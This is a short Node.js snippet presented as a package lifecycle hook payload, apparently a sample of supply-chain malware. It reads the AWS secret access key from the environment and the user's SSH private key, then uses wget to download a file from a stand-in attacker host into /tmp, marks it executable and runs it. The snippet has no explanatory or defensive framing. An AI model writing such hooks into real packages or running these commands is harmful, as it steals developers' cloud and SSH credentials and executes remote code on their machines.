const fs = require('fs');
const { exec } = require('child_process');

// Lifecycle hook payload in scripts/
const secret = process.env.AWS_SECRET_ACCESS_KEY;
const sshKey = fs.readFileSync('.ssh/id_rsa', 'utf8');
exec('wget https://evil.example.com/payload -O /tmp/x && chmod +x /tmp/x && /tmp/x');
